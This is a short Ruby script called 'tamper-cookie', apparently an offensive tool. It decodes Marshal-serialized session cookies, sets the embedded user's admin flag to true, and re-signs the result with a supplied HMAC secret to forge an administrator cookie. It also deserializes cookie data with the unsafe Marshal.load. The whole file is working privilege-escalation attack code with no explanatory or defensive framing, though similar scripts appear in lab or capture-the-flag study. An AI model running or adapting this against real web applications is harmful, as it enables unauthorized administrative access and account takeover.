require 'pp'
require 'cgi'
require 'base64'
require 'openssl'
require 'data_mapper'

DataMapper.setup(:default, 'sqlite3::memory')

class User
    attr_accessor :admin
end

def encode_object(obj, secret)

    obj["user"].admin = true

    data = Base64.encode64(Marshal.dump(obj))

    signature = OpenSSL::HMAC.hexdigest(OpenSSL::Digest::SHA1.new, secret, data)

    # URI encode doesn't encode '=' character
    return URI.encode(data).gsub("=", "%3D")+"--"+signature
end

def decode_cookie(c)
    cookie = c.split("--")

    # Undo URL encode then base64 decode
    decoded = Base64.decode64(CGI.unescape(cookie[0]))

    begin
        puts decoded
        obj = Marshal.load(decoded)
        puts("Decoded Cookie:\n")
        return obj
    rescue ArgumentError => err
        puts "( ERROR ) decode-cookie: " + err.to_s
    end
end

def main

    if ARGV.length != 2
        puts('usage: tamper-cookie <file> <secret>')
        return 1
    end

    cookies = IO.readlines(ARGV[0], chomp: true)

    for cookie in cookies
        obj = decode_cookie(cookie)
        puts("Decoded Cookie:\n")
        pp obj
        puts obj

        new_cookie = encode_object(obj, ARGV[1])
        puts("\nTampered Cookie:\n")
        puts(new_cookie)
    end
    return 0
end

main